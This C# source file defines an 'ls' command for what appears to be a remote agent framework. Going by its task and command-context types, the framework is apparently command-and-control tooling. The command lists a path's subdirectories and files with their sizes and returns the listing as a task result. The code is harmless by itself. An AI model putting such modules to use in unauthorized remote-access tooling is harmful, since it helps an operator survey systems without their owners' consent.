using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class LSResult
    {
        public long Length { get; set; }
        public string Name { get; set; }
        public bool IsFile { get; set; }
    }

    public class ListirectoryCommand : AgentCommand
    {
        public override string Name => "ls";
        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            var list = new List<LSResult>();
            string path;
            if (task.SplittedArgs.Length == 0)
            {
                path = Directory.GetCurrentDirectory();
            }
            else
            {
                path = task.SplittedArgs[0];
            }

            var directories = Directory.GetDirectories(path);
            foreach (var dir in directories)
            {
                var dirInfo = new DirectoryInfo(dir);
                list.Add(new LSResult()
                {
                    Name = dirInfo.Name,
                    Length = 0,
                    IsFile= false,
                });
            }

            var files = Directory.GetFiles(path);
            foreach(var file in files)
            {
                var fileInfo = new FileInfo(file);
                list.Add(new LSResult()
                {
                    Name = Path.GetFileName(fileInfo.FullName),
                    Length = fileInfo.Length,
                    IsFile= true
                });
            }

            context.AppendResult($"Listing of {path}");
            context.Objects(list);
        }

    }
}
